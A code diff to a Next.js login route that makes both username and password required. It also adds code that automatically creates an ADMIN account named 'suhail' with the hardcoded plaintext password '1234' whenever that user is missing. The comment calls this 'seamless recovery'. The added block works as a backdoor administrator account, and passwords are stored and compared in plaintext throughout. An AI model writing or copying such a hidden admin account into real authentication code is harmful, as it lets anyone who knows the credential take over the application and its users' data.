@@ -7,13 +7,27 @@ export async function POST(request: Request) {
   try {
     const { name, password } = await request.json();
 
-    if (!name) {
-      return NextResponse.json({ error: 'Please enter a username' }, { status: 400 });
+    if (!name || !password) {
+      return NextResponse.json({ error: 'Please enter both username and password' }, { status: 400 });
     }
 
-    const user = await prisma.user.findFirst({
-      where: { name: { equals: name, mode: 'insensitive' } }
+    const trimmedName = name.trim();
+
+    // Check if user exists
+    let user = await prisma.user.findFirst({
+      where: { name: { equals: trimmedName, mode: 'insensitive' } }
     });
+
+    // Auto-create default user 'suhail' if they don't exist yet for seamless recovery
+    if (!user && trimmedName.toLowerCase() === 'suhail') {
+      user = await prisma.user.create({
+        data: {
+          name: 'suhail',
+          password: '1234',
+          role: 'ADMIN',
+        },
+      });
+    }
 
     if (!user || user.password !== password) {
       return NextResponse.json({ error: 'Invalid username or password' }, { status: 401 });
